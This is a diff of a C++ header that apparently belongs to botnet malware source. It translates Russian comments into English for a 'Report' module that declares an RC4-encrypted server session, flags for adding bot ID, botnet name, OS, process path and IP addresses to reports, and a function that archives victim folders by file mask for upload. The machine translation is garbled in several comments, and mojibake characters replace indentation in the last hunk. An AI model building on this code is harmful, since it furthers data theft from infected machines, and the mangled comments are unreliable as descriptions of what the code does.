@@ -11,7 +11,7 @@ namespace Report
 {
   typedef struct _SERVERSESSION
   {
-    LPSTR url; //URL сервера.
+    LPSTR url; //URL of the server.
 
     /*
       Функция вызываемая для формирования запроса.
@@ -41,40 +41,40 @@ namespace Report
     typedef int (*RESULTPROC)(DWORD loop, _SERVERSESSION *session);
     RESULTPROC resultProc;
 
-    HANDLE stopEvent; //Сигнал прирывания.
+    HANDLE stopEvent; //Signal priryvaniya.
 
-    //Данные о ключе шифрования для pPostData. Ключ не будет менятся в ходе обработки запросов.
+    //Data on the encryption key for pPostData. The key is not to be stagnant during the processing of requests.
     Crypt::RC4KEY *rc4Key;
 
-    BinStorage::STORAGE *postData; //Пост данные для оправки. При передачи на _Run может быть как NULL,
-                                   //Так уже и созданная. Но не после BinStorage::_pack!
+    BinStorage::STORAGE *postData; //Post data to the mandrel. When you send a _Run can be as NULL,
+                                   //So already created. But not after BinStorage:: _pack!
 
-    void *customData; //Допольнительные данные для внешних функций.
+    void *customData; //EXTRA data to external functions.
   }SERVERSESSION;
 
-  //Коды выхода для REQUESTPROC.
+  //Exit codes for REQUESTPROC.
   enum
   {
-    SSPR_CONTUNUE, //Продложить выполенение.
-    SSPR_END,      //Сессия закончена.
-    SSPR_ERROR     //Сессия закончена с ошибкой.
+    SSPR_CONTUNUE, //Prodlozhit vypolenenie.
+    SSPR_END,      //Session is over.
+    SSPR_ERROR     //The session ended with an error.
   };
 
-  //Основные типы информация для добавления в лог.
+  //The main types of information to be added to the log.
   enum
   {
-    BIF_BOT_ID       = 0x01, //Добавление BOTID и ботнет.
-    BIF_BOT_VERSION  = 0x02, //Добавление версии бота.
-    BIF_TIME_INFO    = 0x04, //Добавление данных о времени.
-    BIF_OS           = 0x08, //Добавление информации об OS.
-    BIF_PROCESS_FILE = 0x10, //Путь процесса.
-    BIF_IP_ADDRESSES = 0x20  //Список IP-адресов.
+    BIF_BOT_ID       = 0x01, //Adding BOTID and botnet.
+    BIF_BOT_VERSION  = 0x02, //Adding a version of the bot.
+    BIF_TIME_INFO    = 0x04, //Adding data about time.
+    BIF_OS           = 0x08, //Adding information about the OS.
+    BIF_PROCESS_FILE = 0x10, //Way process.
+    BIF_IP_ADDRESSES = 0x20  //List of IP-addresses.
   };
 
-  //Флаги для writeFolderAsArchive.
+  //Flags for writeFolderAsArchive.
   enum
   {
-    WFAA_RECURSE = 0x1 //Сохранять поддиректории.
+    WFAA_RECURSE = 0x1 //Save subdirectory.
   };
 
   /*
@@ -186,17 +186,16 @@ namespace Report
   */
   bool writeFile(LPWSTR file, LPWSTR sourcePath, LPWSTR destPath);
   
-  /*
-    Запись папки(с подпапками) в отчет в виде архива.
+  /*В В В В Recording folder (with subfolders) in a report in the form of an archive.
 
-    IN path          - исходная папка.
-    IN fileMask      - массив масок файлов.
-    IN fileMaskCount - кол. элементов в fileMask.
-    IN destPath      - путь назначения или NULL.
-    IN flags         - флаги WFAA_*.
+В В В В IN path - the source folder.
+В В В В IN fileMask - array of file masks.
+В В В В IN fileMaskCount - col. elements in fileMask.
+В В В В IN destPath - destination path, or NULL.
+В В В В IN flags - flags WFAA_ *.
 
-    Return           - true - в случаи успеха, 
-                       false - в случаи ошибки.
-  */
+В В В В Return - true - if successful,
+В В В В В В В В В В В В В В В В В В В В В В В false - if an error occurs.
+В В */
   bool writeFolderAsArchive(LPWSTR path, LPWSTR *fileMask, DWORD fileMaskCount, LPWSTR destPath, DWORD flags);
 };
